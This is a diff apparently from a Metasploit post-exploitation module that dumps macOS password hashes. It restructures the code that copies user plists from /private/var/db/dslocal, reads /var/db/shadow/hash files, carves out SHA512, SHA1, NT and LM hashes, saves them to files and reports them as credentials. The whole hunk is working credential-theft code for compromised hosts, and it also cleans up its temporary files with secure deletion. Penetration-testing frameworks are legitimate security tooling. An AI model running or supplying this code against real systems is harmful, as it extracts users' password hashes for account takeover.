@@ -475,148 +475,149 @@ class Metasploit3 < Msf::Post
 		users = []
 		nt_hash = nil
 		host,port = session.tunnel_peer.split(':')
-		case session.type
-		when /meterpreter/
-			users_folder = cmd_exec("/bin/ls","/Users")
-		when /shell/
-			users_folder = session.shell_command_token("/bin/ls /Users")
-		end
-		users_folder.each_line do |u|
-			next if u.chomp =~ /Shared|\.localized/
-			users << u.chomp
-		end
 
 		# Path to files with hashes
 		nt_file = ::File.join(log_folder,"nt_hash.txt")
 		lm_file = ::File.join(log_folder,"lm_hash.txt")
 		sha1_file = ::File.join(log_folder,"sha1_hash.txt")
 
+		# Check if system is Lion if not continue
+		if ver_num =~ /10\.(7)/
+
+			hash_decoded = ""
+
+			# get list of profiles present in the box
+			profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
+
+			if profiles
+				profiles.each do |p|
+					# Skip none user profiles
+					next if p =~ /^_/
+					next if p =~ /^daemon|root|nobody/
+
+					# Turn profile plist in to XML format
+					cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
+					cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
+					file = cmd_exec("cat /tmp/#{p.chomp}")
+
+					# Clean up using secure delete overwriting and zeroing blocks
+					cmd_exec("/usr/bin/srm -m -z /tmp/#{p.chomp}")
+
+					# Process XML Plist into a usable hash
+					plist_values = read_ds_xml_plist(file)
+
+					# Extract the shadow hash data, decode it and format it
+					plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
+						hash_decoded << sprintf("%02X", b)
+					end
+					user = plist_values['name']
+
+					# Check if NT HASH is present
+					if hash_decoded =~ /4F1010/
+						nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)
+					end
+
+					# Carve out the SHA512 Hash, the first 4 bytes is the salt
+					sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
+
+					print_status("SHA512:#{user}:#{sha512}")
+					file_local_write(sha1_file,"#{user}:#{sha512}")
+					report_auth_info(
+						:host   => host,
+						:port   => 0,
+						:sname  => 'sha512',
+						:user   => user,
+						:pass   => sha512,
+						:active => true
+					)
+					# Reset hash value
+					sha512 = ""
+
+					if nt_hash
+						print_status("NT:#{user}:#{nt_hash}")
+						file_local_write(nt_file,"#{user}:#{nt_hash}")
+						report_auth_info(
+							:host   => host,
+							:port   => 445,
+							:sname  => 'smb',
+							:user   => user,
+							:pass   => nt_hash,
+							:active => true
+						)
+
+						# Reset hash value
+						nt_hash = nil
+					end
+					# Reset hash value
+					hash_decoded = ""
+				end
+			end
+
+			# If system was lion and it was processed nothing more to do
+			return
+		end
+
+		users_folder = cmd_exec("/bin/ls","/Users")
+
+		users_folder.each_line do |u|
+			next if u.chomp =~ /Shared|\.localized/
+			users << u.chomp
+		end
 		# Process each user
 		users.each do |user|
 			if ver_num =~ /10\.(6|5)/
-				case session.type
-				when /meterpreter/
-					guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-				when /shell/
-					guid = session.shell_command_token("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-				end
+
+				guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
+
 			elsif ver_num =~ /10\.(4|3)/
-				case session.type
-				when /meterpreter/
-					guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
-				when /shell/
-					guid = session.shell_command_token("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
-				end
-			elsif ver_num =~ /10\.(7)/
-				require 'rexml/document'
-				hash_decoded = ""
-				profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
-				if profiles
-					profiles.each do |p|
-						next if p =~ /^_/
-						next if p =~ /^daemon|root|nobody/
-						cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
-						cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
-						file = cmd_exec("cat /tmp/#{p.chomp}")
-						plist_values = read_ds_xml_plist(file)
 
-						plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
-							hash_decoded << sprintf("%02X", b)
-						end
-						user = plist_values['name']
-						# Check if NT HASH is present
-						if hash_decoded =~ /0304524E545D53414C5445442D5348413531324F101/
-							nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)
-						end
-						hashes = hash_decoded.gsub(/^\w*1044/,"")
+				guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
 
-						sha512 = hashes.slice(0..135)
-
-
-						print_status("SHA512:#{user}:#{sha512}")
-						file_local_write(sha1_file,"#{user}:#{sha512}")
-						report_auth_info(
-							:host   => host,
-							:port   => 0,
-							:sname  => 'sha512',
-							:user   => user,
-							:pass   => sha512,
-							:active => false
-						)
-						# Reset hash value
-							sha512 = ""
-
-						if nt_hash
-							print_status("NT:#{user}:#{nt_hash}")
-							file_local_write(nt_file,"#{user}:#{nt_hash}")
-							report_auth_info(
-								:host   => host,
-								:port   => 445,
-								:sname  => 'smb',
-								:user   => user,
-								:pass   => nt_hash,
-								:active => true
-							)
-
-							# Reset hash value
-							nt_hash = ""
-						end
-						# Reset hash value
-						hash_decoded = ""
-					end
-				end
-				return
 			end
 
 			# Extract the hashes
-			case session.type
-			when /meterpreter/
-				sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
-				nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
-				lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
-			when /shell/
-				sha1_hash = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
-				nt_hash   = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
-				lm_hash   = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
-			end
+			sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
+			nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
+			lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
+
 
 			# Check that we have the hashes and save them
 			if sha1_hash !~ /00000000000000000000000000000000/
-				print_status("\tSHA1:#{user}:#{sha1_hash}")
+				print_status("SHA1:#{user}:#{sha1_hash}")
 				file_local_write(sha1_file,"#{user}:#{sha1_hash}")
-				report_hash = {
+				report_auth_info(
 					:host   => host,
 					:port   => 0,
 					:sname  => 'sha1',
 					:user   => user,
 					:pass   => sha1_hash,
-					:active => false
-				}
+					:active => true
+				)
 			end
 
 			if nt_hash !~ /000000000000000/
-				print_status("\tNT:#{user}:#{nt_hash}")
+				print_status("NT:#{user}:#{nt_hash}")
 				file_local_write(nt_file,"#{user}:#{nt_hash}")
-				report_hash = {
+				report_auth_info(
 					:host   => host,
 					:port   => 445,
 					:sname  => 'smb',
 					:user   => user,
-					:pass   => sha1_hash,
+					:pass   => nt_hash,
 					:active => true
-				}
+				)
 			end
 			if lm_hash !~ /0000000000000/
-				print_status("\tLM:#{user}:#{lm_hash}")
+				print_status("LM:#{user}:#{lm_hash}")
 				file_local_write(lm_file,"#{user}:#{lm_hash}")
-				report_hash = {
+				report_auth_info(
 					:host   => host,
 					:port   => 445,
 					:sname  => 'smb',
 					:user   => user,
-					:pass   => sha1_hash,
+					:pass   => lm_hash,
 					:active => true
-				}
+				)
 			end
 		end
 	end
